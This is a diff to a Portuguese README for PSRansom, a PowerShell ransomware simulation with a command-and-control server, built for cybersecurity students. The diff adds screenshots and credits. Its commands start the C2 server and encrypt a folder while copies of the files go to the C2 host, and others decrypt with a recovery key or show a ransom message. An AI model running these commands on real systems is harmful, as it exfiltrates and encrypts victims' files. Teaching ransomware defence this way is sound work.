@@ -28,19 +28,35 @@ cd PSRansom
 ls -l
 ```
 
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-01.png" alt="psransom-01.png">
+</div>
+
 04 - Inicie o C2 Server através do comando a seguir:
 
 ```bash
 pwsh C2Server.ps1 + 80
 ```
 
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-02.png" alt="psransom-02.png">
+</div>
+
 05 - No host Windows criei a pasta 100SECURITY com alguns arquivos como exemplo.
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-03.png" alt="psransom-03.png">
+</div>
 
 06 - Realize o download do PSRansom no Windows e execute o comando a seguir:
 
 ```bash
 .\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x
 ```
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-04.png" alt="psransom-04.png">
+</div>
 
 - C:\100SECURITY : Pasta Alvo
 - 192.168.0.76 : Servidor C2
@@ -53,7 +69,15 @@ pwsh C2Server.ps1 + 80
 Chave de Recuperação : WNLmTxjnDpzZGaEF4AsUYgi5
 ```
 
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-05.png" alt="psransom-05.png">
+</div>
+
 Arquivos `criptografados` com a extensão `.psr`
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-06.png" alt="psransom-06.png">
+</div>
 
 08 - Dentro da pasta C2Files o atacante recebe uma cópia de todos os arquivos antes da criptografia.
 
@@ -65,11 +89,19 @@ cd CS2Files
 ls -l
 ```
 
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-07.png" alt="psransom-07.png">
+</div>
+
 07 - Observe que foi criado o arquivo readme.txt contendo a Chave de Recuperação dos arquivos.
 
 ```bash
 Recovery Key : WNLmTxjnDpzZGaEF4AsUYgi5
 ```
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-08.png" alt="psransom-08.png">
+</div>
 
 08 - Para recuperar os arquivos basta digitar o comando a seguir :
 
@@ -77,18 +109,38 @@ Recovery Key : WNLmTxjnDpzZGaEF4AsUYgi5
 .\PSRansom.ps1 -d C:\100SECURITY -K WNLmTxjnDpzZGaEF4AsUYgi5
 ```
 
-Arquivos recuperados com sucesso!
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-09.png" alt="psransom-09.png">
+</div>
+
+Arquivos `recuperados` com sucesso!
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-10.png" alt="psransom-10.png">
+</div>
 
 🔴   Exibindo uma mensagem da Tela do Usuário
-Para exibir a mensagem basta utilizar o parâmetro -demo :
+Para exibir a mensagem basta utilizar o parâmetro `-demo`:
 
 ```bash
 .\PSRansom.ps1 -e C:\100SECURITY -s 192.168.0.76 -p 80 -x -demo
 ```
 
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-11.png" alt="psransom-11.png">
+</div>
+
 💀 Mensagem!
 
-Se o usuário clicar em Pay Now! é exibido um pop-up na tela.
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-12.png" alt="psransom-12.png">
+</div>
+
+Se o usuário clicar em `Pay Now!` é exibido um pop-up na tela.
+
+<div align="center">
+  <img src="https://www.100security.com.br/images/psransom-13.png" alt="psransom-13.png">
+</div>
 
 ## 🔓 Observações
 O impacto e o prejuízo financeiro que este tipo de ataque por causar nas empresa é muito grande, segue algumas recomendações :
@@ -109,6 +161,14 @@ Este projeto é uma simulação de ransomware com um servidor de comando e contr
 
 Este projeto foi inspirado por um tutorial e código fonte fornecido por [JoelGMSec](https://github.com/JoelGMSec). Certifique-se de verificar o tutorial original para obter mais informações detalhadas.
 
+## Fonte da Simulação
+
+As imagens do projeto mostradas acima foram tiradas do tutorial fornecido por [100SECURITY](https://www.100security.com.br/psransom).
+
+---
+**OBSERVAÇÃO:**
+Quero deixar meus agradeçimentos ao [JoelGMSec](https://github.com/JoelGMSec) pela criação do projeto e tambem a equipe [100SECURITY](https://www.100security.com.br/psransom) pela demostração na pratica!!!
+
 ## Sobre o Projeto
 
 O objetivo deste projeto é permitir que os estudantes de segurança cibernética compreendam como um ransomware pode funcionar, bem como aprender a se defender contra esse tipo de ameaça. É importante lembrar que a criação e disseminação de malware são atividades ilegais e prejudiciais.
@@ -124,10 +184,3 @@ Este projeto é apenas para fins educacionais e não deve ser usado para ativida
 ## Licença
 
 Este projeto está sob a [Licença MIT](LICENSE).
-
----
-**AVISO:** O uso deste projeto para fins maliciosos ou ilegais é estritamente proibido. Este projeto foi criado apenas para fins educacionais.
-
-
-
-
